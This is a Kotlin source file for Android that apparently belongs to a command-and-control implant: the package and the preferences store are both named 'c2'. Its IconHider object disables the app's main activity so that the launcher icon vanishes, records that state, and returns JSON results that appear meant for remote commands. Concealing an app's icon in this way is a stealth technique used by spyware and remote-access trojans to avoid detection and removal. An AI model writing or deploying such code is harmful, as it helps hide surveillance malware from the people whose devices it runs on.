package com.outcome.c2

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import org.json.JSONObject

object IconHider {

    private const val PREF_KEY = "icon_hidden"

    fun isHidden(ctx: Context): Boolean {
        return ctx.getSharedPreferences("c2", Context.MODE_PRIVATE)
            .getBoolean(PREF_KEY, false)
    }

    fun hide(ctx: Context): JSONObject {
        return try {
            val cn = ComponentName(ctx.packageName, "${ctx.packageName}.MainActivity")
            ctx.packageManager.setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            ctx.getSharedPreferences("c2", Context.MODE_PRIVATE)
                .edit().putBoolean(PREF_KEY, true).apply()
            JSONObject().put("ok", true).put("hidden", true)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "hide_failed")
        }
    }

    fun show(ctx: Context): JSONObject {
        return try {
            val cn = ComponentName(ctx.packageName, "${ctx.packageName}.MainActivity")
            ctx.packageManager.setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            ctx.getSharedPreferences("c2", Context.MODE_PRIVATE)
                .edit().putBoolean(PREF_KEY, false).apply()
            JSONObject().put("ok", true).put("hidden", false)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "show_failed")
        }
    }
}
